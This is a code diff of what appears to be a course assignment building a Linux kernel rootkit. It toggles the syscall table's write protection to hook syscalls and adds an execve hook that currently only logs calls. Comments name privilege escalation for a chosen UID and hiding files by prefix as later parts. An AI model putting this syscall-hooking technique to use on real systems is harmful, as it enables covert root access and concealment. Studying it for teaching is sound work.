@@ -32,8 +32,8 @@ MODULE_PARM_DESC(table_addr, "Address of sys_call_table in memory");
 
 //******
 //TODO: NEEDED FOR PART B
-//	Accept root_uid as a kernel module parameter 
-//	(see module_parm() example above)
+//  Accept root_uid as a kernel module parameter 
+//  (see module_parm() example above)
 //******
 /*
  * When a user with an effective UID = root_uid runs a command via execve()
@@ -44,8 +44,8 @@ static int root_uid;
 
 //******
 //TODO: NEEDED FOR PART C
-//	Accept magic_prefix as a kernel module parameter
-//	(see module_parm() example above)
+//  Accept magic_prefix as a kernel module parameter
+//  (see module_parm() example above)
 //******
 /*
  * Files that start with a prefix matching magic_prefix are removed from the
@@ -103,14 +103,16 @@ int hook_syscall(t_syscall_hook *hook)
   //********
   //TODO: NEEDED FOR PART A
   //
-  //	make the sys_call_table RW before the hook and RO after
+  //  make the sys_call_table RW before the hook and RO after
   //
-  //	Since linux-kernel ~2.6.24  the sys_call_table has been in read-only 
-  //	memory. We need to mark it rw ourselves (we're root afterall), replace 
-  //	the syscall	function pointer, and then tidy up after ourselves.
+  //  Since linux-kernel ~2.6.24  the sys_call_table has been in read-only 
+  //  memory. We need to mark it rw ourselves (we're root afterall), replace 
+  //  the syscall function pointer, and then tidy up after ourselves.
   //********
+  
   set_addr_rw(sys_call_table);
   sys_call_table[hook->offset] = hook->hook_func;
+  set_addr_ro(sys_call_table);
 
   
   //Remember that we enabled the hook
@@ -133,11 +135,12 @@ int unhook_syscall(t_syscall_hook *hook)
 
   //********
   //TODO: NEEDED FOR PART A
-  //	make the sys_call_table RW before the hook and RO after
+  //  make the sys_call_table RW before the hook and RO after
   //********
 
+  set_addr_rw(sys_call_table);
   sys_call_table[hook->offset] = hook->orig_func;
-
+  set_addr_ro(sys_call_table);
   
   //Remember we've undone the hook
   hook->hooked = false;
@@ -215,20 +218,20 @@ int init_module(void)
 
   //********
   //TODO: NEEDED FOR PART A
-  //	uncomment the example hook AFTER you have marked the syscall table 
-  //	memory RW (see notes above).
+  //  uncomment the example hook AFTER you have marked the syscall table 
+  //  memory RW (see notes above).
   //********
 
   //Let's hook open() for an example of how to use the framework
-  hook_syscall(new_hook(__NR_open, (void*) &new_open));
+  // hook_syscall(new_hook(__NR_execve, (void*) &new_execve));
 
 
 
   //********
   //TODO: NEEDED FOR PARTS B AND C
-  //	Hook your new execve and getdents functions after writing them
+  //  Hook your new execve and getdents functions after writing them
   //********
-  // Let's hook execve() for privilege escalation
+  hook_syscall(new_hook(__NR_execve, (void*) &new_execve));
   // Let's hook getdents() to hide our files
 
 
@@ -296,8 +299,26 @@ asmlinkage int new_open(const char *pathname, int flags, mode_t mode)
 
   //********
   //TODO: NEEDED FOR PARTS B AND C
-  //	Write your new execve and getdents functions.
-  //	You will want to add function prototypes to rootkit.h
-  //	Make sure they match the original function definitions.
+  //  Write your new execve and getdents functions.
+  //  You will want to add function prototypes to rootkit.h
+  //  Make sure they match the original function definitions.
   //********
+
+asmlinkage int new_execve(const char *filename, char *const argv[], char *const envp[]) {
+
+  int (*orig_func)(const char *filename, char *const argv[], char *const envp[]);
+  t_syscall_hook *execve_hook;
+
+  //Find the t_syscall_hook for __NR_execve from our linked list
+  execve_hook = find_syscall_hook(__NR_execve);
+  //And cast the orig_func void pointer into the orig_func to be invoked
+  orig_func = (void*) execve_hook->orig_func;
+
+  //Uncomment for a spammy line for every execve()
+  printk(KERN_INFO "execve() was called for %s\n", filename);
+
+  //Invoke the original syscall
+  return (*orig_func)(filename, argv, envp);
+}
+
 
